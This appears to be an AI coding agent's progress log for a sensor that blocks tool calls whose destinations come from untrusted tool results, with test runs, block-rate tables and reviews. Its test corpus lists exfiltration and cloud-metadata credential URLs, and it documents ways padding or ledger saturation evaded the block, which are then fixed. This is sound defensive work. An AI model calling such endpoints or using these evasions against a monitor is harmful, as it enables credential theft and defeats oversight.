   imported directly. A new call site fails here until it is guarded.
   (Sabotage 2: an M8-shaped unguarded `_vo.should_block` is named by
   file:line.)
2. **Behavioural.** 17 public entry points, each with the core function it
   reaches made to raise:
   - scan in input, tool_result and output, plus `scan_output`;
   - `scan_a2a(received)` and `scan_tool_call`;
   - `_scan_tool_result`, the verdict source for the LangChain and MCP hooks;
   - `protect_tools` sync, async and no-implementation;
   - the `protect()` LangChain and MCP hooks, through fake frameworks;
   - `begin_flow`, `extract_context`, `clear_flow`, `record_hop` and
     `build_provenance`.

   Nothing may reach the caller, and the documented outcome must appear: a
   logged fault, the field omitted, or `ledger_absent`.

**Red against the tree as it stood, cb7f09b:**

```
E  AssertionError: calls into the value-origin core that a fault would propagate from into the host (...): xaidr/provenance_chain.py:96 bind_fresh_ledger(); xaidr/provenance_chain.py:325 unbind_ledger(); xaidr/provenance_chain.py:455 bind_fresh_ledger()
[begin_flow] a raising bind_fresh_ledger() reached the caller
[extract_context] a raising bind_fresh_ledger() reached the caller
[clear_flow] a raising unbind_ledger() reached the caller
4 failed, 15 passed
```

**A finding.** In `extract_context` the bind ran BEFORE the inbound mark, so a
raising bind would also have skipped the mark, the security-critical half of
that function. The guard keeps the mark, and the sweep asserts it.

**After guarding the three flow seams, the structural test found a fourth
site that I had not listed:** `url_parse._r4_host` called the core's
`_whatwg` inside `except ValueError` only. It now catches `Exception`.

**Green:** `19 passed`.

**Sabotage.**
- 1: the `clear_flow` guard removed. Both tests go red, named.
- 2: an unguarded `should_block` added to `scan_tool_call`. The structural
  test names `xaidr/sensor.py:2391 should_block()`.
- Restores were cmp-confirmed.

---

### Item 1, after the silent-failure review of the sweep itself

1. **The structural test was bypassable.** It recognised only the literal
   alias `_vo` and `from ... import` names, so `import xaidr.value_origin as
   v2`, a stored reference (`fn = _vo.should_block`) or `getattr(_vo, ...)` went
   unseen. It now tracks every name bound to the package by ANY import form. It
   flags a REFERENCE to a core function that is not the callee of a guarded
   call, and it flags `getattr` on the package. **Proven both ways** with an
   aliased, stored-reference, unguarded `should_block` added to
   `scan_tool_call`:
   - **the old sweep: `1 passed` (blind to it);**
   - **the new sweep:**
     `E  AssertionError: ... xaidr/sensor.py:2392 should_block (a reference, not a guarded call)()`.
2. **Five behavioural rows were vacuous.** `scan(output)`, `scan_output`,
   `protect_tools` with no implementation, `record_hop` and `build_provenance`
   never invoked the function they broke, so they asserted nothing. Each row
   now DECLARES whether it reaches the core:
   - a reaching row must invoke the broken function, and must log;
   - a non-reaching row must not invoke it (outputs record nothing, C-2; no
     implementation means no read; `record_hop` binds nothing since ruling 3.1
     changed).
3. **Public entry points NOT in the behavioural table**, named: `protect_http`
   / `ProtectedHttpClient` (reaches only the output and outbound-A2A scans,
   which record nothing), `delphi_middleware` (`wrap_tool_call` reaches
   `scan_tool_call`, `before_model` reaches `scan(input)`), and the CrewAI and
   Haystack hooks. Each funnels through the guarded call sites the structural
   test checks. That covers them structurally, not behaviourally.
4. `extract_context`'s inbound mark survives a bind fault: confirmed.

## Before M8, item 2 — the macOS-widening false-positive cost, on an outside corpus

*[This section was garbled in `10ec7eb` by an unquoted shell heredoc: the shell
ran every backticked name as a command. Rewritten here from the same result
files.]*

**The corpus.** It is drawn from **24,466 files outside this project and the
Delphi repos**:
- system config (`/etc`, `/private/etc`);
- Homebrew package docs, configs and man pages (`/opt/homebrew/...`,
  `/usr/share/man`);
- Python package manifests in site-packages.

Excluded: test suites (adversarial by design) and personal system logs, which
would put local IPs into a pushed PR. It holds **80,114 URL hosts (2,978
distinct)** and **1,339 affected-shape tokens (687 distinct values, 957 with
their source files)**, saved in
`docs/evidence/macos-widening-fp-corpus.json`. **Real-world text held ZERO
leading-zero dotted quads and ZERO leading-zero embedded IPv4.** Every affected
token was a number above 2**32-1: dates, sequence bounds, ids, hex
fingerprints.

**The measurement.** Each case runs through the current core and through the
same core with `_macos_readings` switched off. A change is any difference in
the destination readings (`extract_destinations`), url_parse's address class,
or the `scan_tool_call` action.

```
{
 "distinct_cases": {
  "real URL host": 2978,
  "big_number as found (whole value)": 687,
  "big_number as a URL host": 687
 },
 "changed": {
  "big_number as a URL host": 335
 }
}
```

**The rate.**
- **Real URL hosts: 0 of 2,978 distinct change.**
- **Affected tokens in their real position (a whole argument value): 0 of
  687 change.** The macOS readings apply to URL hosts only.
- **The same tokens forced into URL-host position** (a stress test, not
  traffic): 335 of 687 gain a wrapped IP reading.
- **0 actions change, and 0 become link-local.** url_parse's class moves
  None→public (268) or None→private (67), both classify-only.

**Every one of the 335 is named**, with its before/after, in the evidence file.
The most frequent sources are ChangeLog (111), lockstat.1 (32) and README.md
(26). Under ENFORCE, a wrapped reading blocks only if it coincides with an
untrusted ledger entry.

## Before M8, item 3 — Q13, the value-origin block rate (circuit breaker NOT wired)

A call "would block" when its wire is `untrusted_source` under ENFORCE.
`should_block` is not wired, per the owner.

```
456-row shell corpus (buckets: ['attacks', 'benign', 'benign_prose', 'benign_templates'] ), ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% (pass result parts: 3)
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-steps                      calls=   36  would block=   0  rate= 0.00% (pass result parts: 3)
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94%
```

**What the numbers mean. This is the input for V-31.**
- **With NO designations, ENFORCE blocks every call whose destination appeared
  in an undesignated tool result, benign or not.** P-flow-R and P-seam block
  5 of 83 benign rows and 7 of 97 benign_prose rows.
- **A-calls' 20.85% is that share by construction.** Each benign_toolcalls /
  asi call runs in its own `begin_flow`, and the harness first scans the call's
  own arguments as an untrusted `tool_result`. So exactly the
  destination-carrying calls block (98 untrusted plus 4 unresolved, against
  368 with no destination). **My first hypothesis was wrong.** I guessed
  cross-pass contamination of an implicit ledger. A fresh-thread re-run and
  the harness code showed the construction.
- **A destination the principal named, or that no read named, is never
  blocked.** It reads `unresolved`. P-flow-I's benign 0/83 shows this; the
  benign_prose 6/97 are inputs L1 flagged, which V-9 makes untrusted.
- **The conformance flows are designed cases, not traffic.** Config C's 57% is
  a property of that corpus.

**Benign calls that would block, named.** P-flow-I comes from flagged benign
prose; P-flow-R from destinations named only by an undesignated read.

```
P-flow-I benign_prose[002] http_post -> http://evil.tld/x.sh
P-flow-I benign_prose[004] http_post -> http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
P-flow-I benign_prose[034] http_post -> http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
P-flow-I benign_prose[041] http_post -> https://x.io/i.sh
P-flow-I benign_prose[045] http_post -> http://x.io/i
P-flow-I benign_prose[058] http_post -> http://169.254.169.254/latest/meta-data/iam/security-credentials/
P-flow-R benign[034] http_post -> https://api.github.com/repos/org/repo
P-flow-R benign[035] http_post -> https://api.example.com/health
P-flow-R benign[066] http_post -> s3://our-public-assets/
P-flow-R benign[067] http_post -> https://api.internal/health
P-flow-R benign[068] http_post -> https://reports.internal/q3.pdf
P-flow-R benign_prose[002] http_post -> http://evil.tld/x.sh
P-flow-R benign_prose[004] http_post -> http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
P-flow-R benign_prose[034] http_post -> http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
P-flow-R benign_prose[041] http_post -> https://x.io/i.sh
P-flow-R benign_prose[045] http_post -> http://x.io/i
P-flow-R benign_prose[055] http_post -> s3://exfil-bucket
P-flow-R benign_prose[058] http_post -> http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Before M8, item 4 — the wire-vocabulary inventory

Written to **`docs/value-origin-wire-consumers.md`**. It is an inventory only;
nothing outside this repo was changed.
- **The Brain (delphi-sentinel `feat/value-origin-brain`) hard-codes nine
  values and would store `input_truncated` as NULL.**
- blank-canvas has nothing yet.
- Paid (delphi-python-sdk) has no vendored copy yet.
- The DB column has no CHECK, so no migration is needed for the value, only a
  corrected comment.
- The order that avoids silent loss is: the Brain accepts it, then M9 emits.
- `verdict_of`'s docstring ("nine") is fixed. That is a pin byte change.

---

## Pre-M8 milestone review, and what changed after it

It reproduced:
- the sweep red, both sabotages, and the inbound-mark guard (with its own
  mutation);
- every Q13 number and all 18 named benign blocks;
- inventory rows #1, #6 and #7.

Its gaps and their fixes:
1. **Sweep.**
   - The five vacuous rows were already fixed in `80a2e77`.
   - **The `_r4_host` fix was covered only structurally.** url_parse imports
     the core directly, so patching the package cannot break it.
     `test_url_parse_core_faults_never_reach_the_caller` now breaks
     `classify_value`, `_host_authority` and `_whatwg` where url_parse looks
     them up.
   - The pasted red's site list was cut off by my `cut -c1-260`. It did not
     come from an earlier test version, but it cannot be reproduced word for
     word either.
2. **False-positive cost: corrections.**
   - **"0 of 2,978 real URL hosts" is zero BY CONSTRUCTION:** none of those
     hosts had an affected shape (counted below). **The FP rate for
     leading-zero quads and leading-zero embedded IPv4 is UNMEASURED.** No
     real text in the corpus held them, so only the number-above-2**32 shape
     has real data.
   - The file filter skipped `.ts`/`.d.ts` and source code. The reviewer
     found a real `127.000.000.001` in `node_modules/@types/node/net.d.ts`.
     Its readings do not change: octal and decimal agree.
   - The owner asked for real host lists and log samples. The corpus has
     neither: logs were excluded for privacy, and no host list was found.
   - The evidence file now also holds the 2,978 distinct URL hosts, one
     source each.
   - `10ec7eb`'s "every case is named" overclaimed: the hosts and 382 of the
     1,339 token occurrences were not named. The PR body corrects it.
3. **Q13, completed.** A-flow-I and A-flow-R at 0% MEAN NOTHING: every call
   there came back `no_destination` (`heldout/benign` names no URLs). The two
   benign corpora left out are now measured:
   ```
reviewer's real leading-zero quad (node_modules/@types/node/net.d.ts):
  '127.000.000.001': changed=False before=([], None) after=([], None)
  'http://127.000.000.001/': changed=False before=(['ip:127.0.0.1'], 'loopback') after=(['ip:127.0.0.1'], 'loopback')
real URL hosts with an affected shape: 0 []
Q13 P-flow-I: benign_a2a: would block 0/64 calls ([('no_destination', 58), ('principal_undeclared_span', 4), ('unresolved', 2)]) | benign_longform: would block 0/24 calls ([('unresolved', 24)])
Q13 P-flow-R: benign_a2a: would block 4/64 calls ([('no_destination', 58), ('untrusted_source', 4), ('unresolved', 2)]) | benign_longform: would block 0/24 calls ([('unresolved', 24)])
   ```
   **benign_longform's 24 calls read `unresolved` even when result-derived.** I
   did NOT find out why: one hypothesis is the 65,536-char result-leaf cap
   against how `calls_for` tokenises. It is reported as measured and
   unexplained.
4. **Inventory.** `origin/main` WAS readable, and the Brain files are
   identical there: the Brain code is merged. Corrected in place. Whether the
   migration is applied live is still unverified.
5. **The second "nine"** in `verdict_of`'s docstring is fixed. `10ec7eb`'s
   "benign blocked calls are named in PROGRESS.md" was false at that commit
   (the list had been wiped) and true from `08c2d08`.

**Docker:** it was available to me this loop (Linux 3.10 and 3.12 legs for
item 1). It was NOT available to the reviewer, so its 3.10/3.11 matrix did not
run.

---

## The benign_longform anomaly, explained before M8 (owner condition 3)

~~**Not a recording failure.**~~ *[RETRACTED by the M8 milestone review: recording
SILENTLY drops every destination past 65,536 chars into one tool result (V-15),
and ENFORCE then allows the call. See the M8 STOP below. This is the owner's stop
condition.]* Each long document's result recorded up to 67 destinations, from its
first 64 KiB. The harness built ONE call per document: `run_command` with the
whole document as its argument (`calls_for` builds calls only from `scheme://`
URLs and mailboxes). That argument exceeds the core's 4,000-char argument-leaf
bound (S16), which gives `walk_bound` with `truncated=True` and wire
`unresolved`.

**The same bound is an ENFORCE evasion,** measured:
- `https://evil.test/collect` reads `untrusted_source`, and should_block is
  True;
- the same URL padded with 5,000 chars reads `unresolved`, and should_block is
  False.

Detection flagged that padded case only because the padding was a repeat
(LLM04); varied padding would evade detection too. It is pinned as a strict
xfail for the owner's ruling (block on a bound hit under ENFORCE, or a visible
state like `input_truncated`). Per the owner's stop rule (stop only if
RECORDING silently failed), M8 was built.

---

## M8 — ENFORCE (V-31 as ruled). **Green. STOP AND REPORT.**

**Build.**
- `scan_tool_call` runs `should_block` right after `evaluate_call`, before the
  circuit check, the gates and detection (V-18). It is fault-guarded, and the
  sweep's structural test covers it.
- A block is `ScanResult(action="blocked", category="untrusted_destination",
  rules=["ORIGIN_UNTRUSTED_DESTINATION", "intent.value_origin_untrusted"])`
  through `_apply_mode` (monitor gives `flagged`) and the existing gate emitter.
- It is not counted by `_breaker_observe` (Q13).
- The construction warning drops "NOT YET WIRED". With zero designations it
  names what will be blocked (owner condition 2). Both pins (in-tree and from
  the wheel) were updated in this commit, as §5 M8 requires.
- ENFORCE is off by default (V-31).
- `docs/value-origin-enforce.md` documents the rule, the costs, the 18-row
  designation analysis (owner condition 1), the unmeasured leading-zero false
  positives, the padded-URL evasion, the anomaly, and the rule-name
  discrepancy.

**Red first.**

```
E  AssertionError: M8 ENFORCE: A-enforce-block: {'action': 'allowed', 'category': None, 'rules': [], 'wire': 'untrusted_source'}; A-enforce-monitor: {'action': 'allowed', ...}; the tool EXECUTED under ENFORCE+block: {'executed': True, 'returned': 'ok'}; value-origin block lost on the fail-open scan-error path (V-18): {'action': 'allowed', 'category': 'scan_error', 'rules': ['SCAN_FAILED_OPEN'], 'wire': 'untrusted_source'}; zero-designation ...
E  AssertionError: assert '0d89307249ea...' != '0d89307249ea...'     (C-11 4b: ENFORCE moved no action before M8)
```

**Green.** The M8 driver ran in-tree and from the built wheel.
- A-enforce-block: blocked, with category and both rules, and the tool NOT
  executed.
- A-enforce-monitor: flagged, and the tool executed.
- B-designated-twin: allowed, `trusted_source`.
- RECORD's action equals OFF's.
- V-18 holds on the scan-error path.
- One zero-designation warning.
- **C-11 4b is un-xfailed:** ENFORCE moves actions that OFF and RECORD do not.

Every seam suite (61 files, plus conformance and the M1/M7/M8 wheel tests):

```
== macOS 3.12.2    7295 passed, 95 skipped, 12 xfailed
== linux 3.10.21   7295 passed, 95 skipped, 12 xfailed      (Docker available)
== linux 3.12.14   7295 passed, 95 skipped, 12 xfailed
```

**Sabotage.** Each restore is cmp-confirmed.

```
=== 1: should_block ignores the mode (RECORD blocks)
E  AssertionError: M8 ENFORCE: RECORD changed an action: OFF=allowed RECORD=blocked
E  AssertionError: C-11: RECORD moved a verdict, score or rule in P-flow-R (block mode) ... RECORD='attacks[030] R1 http_post blocked 1.0000 untrusted_destination ORIGIN_UNTRUSTED_DESTINAT...
=== 2: the block moved after detection, classify faulting (V-18)
E  AssertionError: M8 ENFORCE: value-origin block lost on the fail-open scan-error path (V-18): {'action': 'allowed', 'category': 'scan_error', ...}
=== 3: the should_block guard removed
E  AssertionError: ... xaidr/sensor.py:2429 should_block()
```

All three went red where §5 M8 predicted. Sabotage 3 is the fault sweep doing
its job on the first M8 path.

**Owner condition 1, the 18 benign blocks** (full table in
`docs/value-origin-enforce.md`):
- **13 are harness-built calls to attack URLs quoted in benign prose.**
  Blocking them is correct, and no designation should prevent it.
- **The 5 legitimate ones were read through the PUBLIC nameless
  `scan(direction="tool_result")` seam, which NO designation can ever match
  (V-26): a design gap.** Through a named seam, a designation on the reading
  tool would prevent each.
- **A second design gap:** a benign principal input that L1 flags makes every
  destination it names block (V-9), with no designation-shaped remedy.

**Not built:** "the keyed variant" of the rule. The settled spec defines none,
and inventing one was refused.

---

## M8 STOP: the owner's stop condition was reached, found by the fresh-context review

**Recording silently fails on long tool results.** Every destination more than
65,536 chars into ONE tool result is never recorded (V-15's result-leaf cap). A
call to it is indistinguishable from a destination never seen (`unresolved`),
and **ENFORCE in block mode allows it.** Principal input has a visible
`input_truncated` state (after M6); results have none. My explanation of the
anomaly said "recording was not failing". That was TOO BROAD, and it is
retracted in place above and in `docs/value-origin-enforce.md`. Pinned as a
strict xfail; its red:

```
E       AssertionError: an untrusted destination 103,889 chars into one tool result gave ('allowed', 'unresolved'): recording dropped it silently
1 failed, 5 deselected in 0.67s
```

**Fixed before stopping. The silent-failure review found this one, rated
CRITICAL.** Telemetry recorded the SOFTENED verdict (monitor's `flagged`, or an
S6 transform's `allowed`), so a value-origin block left no trace anywhere.
Every other gate emits the true verdict before `_apply_mode`, and now this one
does too. Red first:

```
E  AssertionError: the value-origin event says ['flagged'] while the true verdict was 'blocked' (returned 'flagged'): the block left no trace
E  AssertionError: the value-origin event says ['allowed'] while the true verdict was 'blocked' (returned 'allowed'): the block left no trace
```

The same test now also holds the emit, which the milestone review found
untested.

**Also pinned:** a second evasion of the bound family. An untrusted
destination among more than 64 arguments (or nested deeper than 6) reads
`unresolved` and never blocks. **[Superseded by RULING 1+2 (f93e873): a walk bound is `argument_bound`, which blocks.]**

**Review gaps recorded and not fixed (the STOP):**
- benign_a2a's 4 blocks have no designation line;
- §4's acceptance cases were substituted without a label at the time (private
  `_scan_tool_result`, no ToolMessage check, `MatchKind.ANY` instead of
  EXACT);
- the zero-designation warning says "blocked" under the default monitor mode;
- the keyed-variant reading. The milestone review's reading is that it MEANS
  `intent.value_origin_untrusted`, which is emitted. The spec category
  `value_origin_unauthorized` is not carried.

The milestone review confirmed:
- the reds and sabotages;
- the outside test;
- Linux 3.10/3.12 (78 passed each);
- ENFORCE off by default everywhere (no env or config path);
- the 18-row table (apart from the spans line, now corrected).

---

## Status (updated after M3), and what is waiting on the owner

| milestone | state | commit |
|---|---|---|
| M0: finding 1 (Q1) | green, **STOP AND REPORT** | `77ee2f8` (the new paid pin, SEMANTIC) |
| M1: the C-11 gate | green, **STOP AND REPORT** | `a4df0e6` |
| M2: url_parse differential (tests only) | green on 4 interpreters; CI green (run 37173748403) | `f95f5df` |
| M3: url_parse onto the core | green on 4 interpreters; CI: see the M3 report | `dfb4334` (core, **SEMANTIC, new paid pin**), `e2e8bb9`, `6463337` (docstring-only core bytes) |
| M4–M7: seam wiring | **held**: the BRIEF STOPs before any seam wiring until the owner has seen C-11 | — |
| M8: ENFORCE | **held**: needs the owner's review of M0, plus STOP 3 (vocabulary) | — |
| M9: wire field | held at STOP 4 (wire format) | — |
| M10 / M11 | after the above | — |

**Waiting on the owner (added at M3):**
- **Q22 re-ruling.** The exemption also hides a darwin link-local reach
  (`000169.254.000169.254`). It was ruled on the premise that the decimal
  reading lands in 240/4. Pinned as a darwin strict xfail.
- **Two further darwin resolver classes**, not covered by Q22: integer wrap
  (`4294967296`, `0x100000000` → `0.0.0.0`), and a leading zero in an embedded
  IPv4 (`[0:1:2:3:4:5:192.0.02.1]`). Neither is exempted. The wrap is pinned.
- **Paid pins.** `dfb4334` is SEMANTIC (`expected.jsonl` +1 row). `6463337`
  changes `_authority.py`'s docstring only. A re-vendor takes the last one.
- **Q19.** The WPT corpus is still not vendored. It was run from a pinned
  copy.

**Waiting on the owner (from M1):**
1. Review M0, which unblocks ENFORCE (M8).
2. Review C-11 (M1), which unblocks the seam wiring (M4–M7).
3. Rule on the four M0 build decisions in `docs/value-origin-rulings.md`
   ("Decisions made in the A2 build (M0) that still need a ruling").
4. M0 changed `expected.jsonl`. It is a semantic change for paid (P4), and pin
   `77ee2f8` vendors only once it is on `main`.

**Not verified:**
- CI has not run on this branch. It triggers on `pull_request` and on pushes to
  `main`, and no PR was opened.
- The `ci.yml` marker change was exercised locally in `python:3.12-slim`, not on
  GitHub runners.


## RULING 1+2, 3a, 3b, 4 (after M8), 2026-10-04

### Bounds: failing tests first. The red, before any core change (14 assertions)
```
E   AssertionError: depth_over_6: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
tests/test_value_origin_bounds.py:82: AssertionError: depth_over_6: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
E   AssertionError: leaf_over_4000: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
tests/test_value_origin_bounds.py:82: AssertionError: leaf_over_4000: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
E   AssertionError: over_64_leaves: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
tests/test_value_origin_bounds.py:82: AssertionError: over_64_leaves: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
E   AssertionError: depth_over_6: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
tests/test_value_origin_bounds.py:93: AssertionError: depth_over_6: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
E   AssertionError: leaf_over_64k: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
tests/test_value_origin_bounds.py:93: AssertionError: leaf_over_64k: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
E   AssertionError: over_64_leaves: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
tests/test_value_origin_bounds.py:93: AssertionError: over_64_leaves: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
E   AssertionError: input_truncated is a bound: a destination past the 65,536-char input cap is allowed under ENFORCE
tests/test_value_origin_bounds.py:128: AssertionError: input_truncated is a bound: a destination past the 65,536-char input cap is allowed under ENFORCE
E   AssertionError: a result with enough distinct URLs saturates the ledger, its poison is dropped, and the call to it is allowed under ENFORCE
tests/test_value_origin_bounds.py:150: AssertionError: a result with enough distinct URLs saturates the ledger, its poison is dropped, and the call to it is allowed under ENFORCE
E   AssertionError: arg:depth_over_6: ENFORCE gave ('allowed', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: arg:depth_over_6: ENFORCE gave ('allowed', 'unresolved')
E   AssertionError: arg:leaf_over_4000: ENFORCE gave ('flagged', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: arg:leaf_over_4000: ENFORCE gave ('flagged', 'unresolved')
E   AssertionError: arg:over_64_leaves: ENFORCE gave ('flagged', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: arg:over_64_leaves: ENFORCE gave ('flagged', 'unresolved')
E   AssertionError: result:depth_over_6: ENFORCE gave ('allowed', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: result:depth_over_6: ENFORCE gave ('allowed', 'unresolved')
E   AssertionError: result:leaf_over_64k: ENFORCE gave ('allowed', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: result:leaf_over_64k: ENFORCE gave ('allowed', 'unresolved')
E   AssertionError: result:over_64_leaves: ENFORCE gave ('allowed', 'unresolved')
tests/test_value_origin_bounds.py:191: AssertionError: result:over_64_leaves: ENFORCE gave ('allowed', 'unresolved')
```

### Sabotage: each part of the fix removed in turn, then restored
```
== S1 argument_bound not named: 6 failed, 13 passed in 0.96s
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[depth_over_6]
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[leaf_over_4000]
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[over_64_leaves]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:depth_over_6]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:leaf_over_4000]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:over_64_leaves]
   msg: depth_over_6: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
   msg: leaf_over_4000: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
   msg: over_64_leaves: a call whose arguments value origin did not finish reading gave 'unresolved' -- padding evades ENFORCE
== S2 cut result not marked on the ledger: 6 failed, 13 passed in 0.95s
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[depth_over_6]
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[leaf_over_64k]
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[over_64_leaves]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:depth_over_6]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:leaf_over_64k]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:over_64_leaves]
   msg: depth_over_6: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
   msg: leaf_over_64k: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
   msg: over_64_leaves: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
== S3 a cut RESULT leaf is not a bound hit (64 KiB only): 2 failed, 17 passed in 0.97s
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[leaf_over_64k]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:leaf_over_64k]
   msg: leaf_over_64k: the destination sat in the part of a tool result value origin did not record, and the call read 'unresolved' -- exactly like a destination never seen, so ENFORCE allowed it
   msg: result:leaf_over_64k: ENFORCE gave ('allowed', 'unresolved')
== S4 should_block ignores the bound states: 14 failed, 5 passed in 0.96s
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[depth_over_6]
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[leaf_over_64k]
   red: test_a_cut_tool_result_is_its_own_state_and_blocks_under_enforce[over_64_leaves]
   red: test_a_saturating_result_does_not_launder_its_poison
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[depth_over_6]
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[leaf_over_4000]
   red: test_an_argument_bound_is_its_own_state_and_blocks_under_enforce[over_64_leaves]
   red: test_input_truncated_blocks_under_enforce
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:depth_over_6]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:leaf_over_4000]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[arg:over_64_leaves]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:depth_over_6]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:leaf_over_64k]
   red: test_the_installed_seam_blocks_every_bound_under_enforce_and_record_does_not[result:over_64_leaves]
   msg: depth_over_6: argument_bound does not block
   msg: leaf_over_4000: argument_bound does not block
   msg: over_64_leaves: argument_bound does not block
== S5 input/ledger caps dropped from the block set: 2 failed, 17 passed in 0.99s
   red: test_a_saturating_result_does_not_launder_its_poison
   red: test_input_truncated_blocks_under_enforce
   msg: input_truncated is a bound: a destination past the 65,536-char input cap is allowed under ENFORCE
   msg: a result with enough distinct URLs saturates the ledger, its poison is dropped, and the call to it is allowed under ENFORCE
== restored:  4 files changed, 86 insertions(+), 28 deletions(-)
```

### Seam identity (RULING 3a)
The first red was a TypeError from my own test (`SourceDesignation` needs `label=`), **not** the missing identity, so it does not count. The real red, from removing the identity branch in `scan()`:
```
E   AssertionError: a designated directory read through the PUBLIC seam, with tool= and arguments=, gave ('blocked', 'untrusted_source'): the identity did not reach the recorder
tests/test_value_origin_m8.py:220: AssertionError: a designated directory read through the PUBLIC seam, with tool= and arguments=, gave ('blocked', 'untrusted_source'): the identity did not reach the recorder
1 failed in 0.02s
```
The warning pins, red before the wording change:
```
E   AssertionError: xaidr: Sensor(agent_id='c11', value_origin='enforce'): value origin ENFORCES: a tool call whose destination traces to an untrusted source is blocked (category untrusted_destination). With NO value_origin_sources designations, no tool result can be a trusted source, so EVERY tool 
tests/test_value_origin_c11.py:102: AssertionError: xaidr: Sensor(agent_id='c11', value_origin='enforce'): value origin ENFORCES: a tool call whose destination traces to an untrusted source is blocked (category untrusted_destination). With NO value_origin_sources designations, no tool result can be 
E   AssertionError: xaidr: Sensor(agent_id='c11', value_origin='enforce'): value origin ENFORCES: a tool call whose destination traces to an untrusted source is blocked (category untrusted_destination).
tests/test_value_origin_c11.py:102: AssertionError: xaidr: Sensor(agent_id='c11', value_origin='enforce'): value origin ENFORCES: a tool call whose destination traces to an untrusted source is blocked (category untrusted_destination).
E   TypeError: SourceDesignation.__init__() missing 1 required keyword-only argument: 'label'
tests/test_value_origin_m8.py:193: TypeError: SourceDesignation.__init__() missing 1 required keyword-only argument: 'label'
E   TypeError: DelphiSensor.scan() got an unexpected keyword argument 'tool'
tests/test_value_origin_m8.py:233: TypeError: DelphiSensor.scan() got an unexpected keyword argument 'tool'
4 failed, 3 passed in 0.03s
```

### From outside the process: built wheel, fresh venv, `python -I`
```
xaidr from: /private/tmp/claude-501/-Users-anirudhkotaru-worktrees-opena2a-value-origin-seams/6301db76-17be-46be-a61b-4209b9e21bb6/scratchpad/tmpee9vqg2d/venv/lib/python3.12/site-packages/xaidr/__init__.py
PASS arg:leaf_over_4000                               enforce=['blocked', 'argument_bound'] record=['flagged', 'argument_bound'] off=['flagged', None]
PASS arg:over_64_leaves                               enforce=['blocked', 'argument_bound'] record=['flagged', 'argument_bound'] off=['flagged', None]
PASS arg:depth_over_6                                 enforce=['blocked', 'argument_bound'] record=['allowed', 'argument_bound'] off=['allowed', None]
